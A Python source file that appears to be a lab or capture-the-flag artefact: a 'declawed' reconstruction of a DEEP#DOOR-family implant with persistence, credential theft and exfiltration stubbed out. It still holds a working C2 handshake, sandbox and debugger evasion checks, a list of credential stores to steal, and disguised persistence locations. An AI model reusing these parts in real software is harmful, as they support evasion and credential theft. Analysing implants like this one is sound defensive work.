#!/usr/bin/env python3
# svc.py — recovered Python implant from eng-bell-04.
#
# Structural reconstruction of the DEEP#DOOR family implant described
# in Securonix Threat Research. This copy has been DECLAWED for analysis:
#   - HANDLER_HOST is pinned to 127.0.0.1 (the original used bore.pub)
#   - Persistence helpers print a marker line instead of writing to the
#     host (Run key, Startup VBS, schtasks, WMI subscription)
#   - Credential collection routines list target paths but do not read
#     them; the exfil function returns immediately
#   - Watchdog thread is a no-op
#
# The challenge-response handshake routine and anti-analysis checks
# remain functionally complete so that the implant can authenticate to
# a captured handler listener (see c2-replay container).

from __future__ import annotations

import base64
import ctypes
import hashlib
import json
import logging
import os
import platform
import random
import socket
import sys
import threading
import time
from pathlib import Path

# ---------------------------------------------------------------------
# Handler configuration
# ---------------------------------------------------------------------

HANDLER_HOST = "127.0.0.1"
# Original family scanned 1024-65535 with up to 100 worker threads to
# find the live bore.pub tunnel port. For analysis purposes the port
# range is collapsed to a single value.
HANDLER_PORT_RANGE = (41234, 41243)

# Pre-shared activation phrase. Encoded as base64 of the cleartext
# password before being mixed with the per-connection challenge.
HANDLER_PASSWORD = "changeme123"

# ---------------------------------------------------------------------
# Credential collection targets (read-only inventory — exfil disabled)
# ---------------------------------------------------------------------

CRED_TARGETS = {
    "chrome_login_data": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data",
    "edge_login_data":   r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data",
    "firefox_logins":    r"%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json",
    "firefox_history":   r"%APPDATA%\Mozilla\Firefox\Profiles\*\places.sqlite",
    "windows_creds":     r"%LOCALAPPDATA%\Microsoft\Credentials\*",
    "aws_credentials":   r"%USERPROFILE%\.aws\credentials",
    "azure_token_cache": r"%USERPROFILE%\.azure\msal_token_cache.json",
    "gcp_credentials":   r"%APPDATA%\gcloud\application_default_credentials.json",
    "ssh_private_keys":  r"%USERPROFILE%\.ssh\id_*",
    "wifi_profiles":     "netsh wlan show profile",
}

# ---------------------------------------------------------------------
# Anti-analysis (functional but inert — only reads)
# ---------------------------------------------------------------------

VM_REGISTRY_INDICATORS = [
    r"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
    r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
    r"SYSTEM\CurrentControlSet\Services\VMTools",
    r"SYSTEM\CurrentControlSet\Services\xenvdb",
    r"SYSTEM\CurrentControlSet\Services\hvService",
]

ANALYSIS_PROCESSES = {
    "wireshark.exe", "procmon.exe", "procmon64.exe",
    "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
    "ollydbg.exe", "burpsuite.exe", "fiddler.exe",
    "processhacker.exe", "tcpview.exe",
}

ANALYSIS_USERNAMES = {"admin", "user", "sandbox", "malware", "test", "analyst"}


def _is_debugger_present() -> bool:
    if platform.system() != "Windows":
        return False
    try:
        return bool(ctypes.windll.kernel32.IsDebuggerPresent())  # type: ignore[attr-defined]
    except (AttributeError, OSError):
        return False


def _vm_registry_signal() -> bool:
    if platform.system() != "Windows":
        return False
    try:
        import winreg  # type: ignore
    except ImportError:
        return False
    for key in VM_REGISTRY_INDICATORS:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key):
                return True
        except OSError:
            continue
    return False


def _analysis_process_signal() -> bool:
    # Best-effort: walk /proc on Linux, fall back to a stub on others.
    seen: set[str] = set()
    proc_root = Path("/proc")
    if proc_root.is_dir():
        for entry in proc_root.iterdir():
            if not entry.name.isdigit():
                continue
            comm = entry / "comm"
            try:
                seen.add(comm.read_text().strip().lower())
            except OSError:
                continue
    return bool(seen & {p.lower().replace(".exe", "") for p in ANALYSIS_PROCESSES})


def _sandbox_username_signal() -> bool:
    return (os.environ.get("USERNAME") or os.environ.get("USER") or "").lower() in ANALYSIS_USERNAMES


def _resource_signal() -> bool:
    # Sandboxes typically have constrained resources. Heuristic: very low
    # CPU count or very small RAM is suspicious.
    try:
        cpu_count = os.cpu_count() or 0
    except OSError:
        cpu_count = 0
    return cpu_count > 0 and cpu_count < 2


def is_under_analysis() -> bool:
    return any((
        _is_debugger_present(),
        _vm_registry_signal(),
        _analysis_process_signal(),
        _sandbox_username_signal(),
        _resource_signal(),
    ))


# ---------------------------------------------------------------------
# Persistence (DECLAWED — emits marker lines instead of mutating host)
# ---------------------------------------------------------------------

_PERSIST_LOG = logging.getLogger("svc.persist")


def _declawed(action: str, target: str) -> None:
    _PERSIST_LOG.info("[DECLAWED] would have performed %s on %s", action, target)


def install_run_key() -> None:
    _declawed(
        "registry-set",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemServices",
    )


def install_startup_vbs() -> None:
    _declawed(
        "file-create",
        r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemServices.vbs",
    )


def install_scheduled_task() -> None:
    _declawed(
        "schtasks-create",
        r"\Microsoft\Windows\WindowsUpdate\SystemServicesCheck",
    )


def install_wmi_subscription() -> None:
    _declawed(
        "wmi-create",
        r"\\root\subscription:__EventConsumer.Name='WindowsHealthMonitor'",
    )


def install_all_persistence() -> None:
    install_run_key()
    install_startup_vbs()
    install_scheduled_task()
    install_wmi_subscription()


# ---------------------------------------------------------------------
# Handler challenge-response handshake (functional)
# ---------------------------------------------------------------------


def compute_handshake_reply(challenge: bytes, password: str = HANDLER_PASSWORD) -> str:
    """Return the lowercase hex digest the implant sends in reply to a
    handler challenge. This is the primitive recovered from svc.py and
    reproduced against the c2-replay listener for Token 5.
    """
    encoded = base64.b64encode(password.encode("utf-8"))
    digest = hashlib.sha256()
    digest.update(challenge)
    digest.update(encoded)
    return digest.hexdigest()


def open_handler_channel(timeout_s: float = 5.0) -> str | None:
    """Connect to the handler, perform the handshake, and return whatever
    the handler sends after a successful authentication. Returns None on
    failure.

    Originally the implant probed the full 1024-65535 range with up to
    100 worker threads; the declawed copy walks a small fixed range and
    stops at the first reachable port.
    """
    log = logging.getLogger("svc.handler")
    lo, hi = HANDLER_PORT_RANGE
    ports = list(range(lo, hi + 1))
    random.shuffle(ports)
    for port in ports:
        try:
            with socket.create_connection((HANDLER_HOST, port), timeout=timeout_s) as sock:
                challenge = sock.recv(128).strip()
                if not challenge:
                    continue
                reply = compute_handshake_reply(challenge)
                sock.sendall(reply.encode("ascii") + b"\n")
                response = sock.recv(256).strip().decode("utf-8", errors="replace")
                if response:
                    log.info("handler accepted handshake on port %d", port)
                    return response
        except OSError as exc:
            log.debug("port %d unreachable: %s", port, exc)
    return None


# ---------------------------------------------------------------------
# Credential collection (DECLAWED — inventory only)
# ---------------------------------------------------------------------


def collect_credentials() -> dict[str, str]:
    """Originally walked CRED_TARGETS, parsed each store, and returned
    a structured credential dump. The declawed copy returns the inventory
    so the analyst can see what was targeted, without touching the host's
    real credential stores.
    """
    _PERSIST_LOG.info("[DECLAWED] would have collected from %d credential stores", len(CRED_TARGETS))
    return {name: "<not-collected:declawed>" for name in CRED_TARGETS}


def exfiltrate(_data: dict[str, str]) -> None:
    _PERSIST_LOG.info("[DECLAWED] exfiltration disabled")


# ---------------------------------------------------------------------
# Watchdog (DECLAWED — no-op)
# ---------------------------------------------------------------------


def watchdog_loop() -> None:
    while True:
        time.sleep(60.0)


# ---------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------


def main() -> int:
    logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(name)s: %(message)s")
    log = logging.getLogger("svc")

    if is_under_analysis():
        log.info("analysis environment detected; aborting handler contact")
        return 0

    log.info("installing persistence (declawed)")
    install_all_persistence()

    watchdog = threading.Thread(target=watchdog_loop, daemon=True)
    watchdog.start()

    log.info("contacting handler")
    response = open_handler_channel()
    if response is None:
        log.info("handler unreachable; sleeping")
        return 0

    log.info("handler response: %s", response)
    creds = collect_credentials()
    exfiltrate(creds)
    return 0


if __name__ == "__main__":
    sys.exit(main())
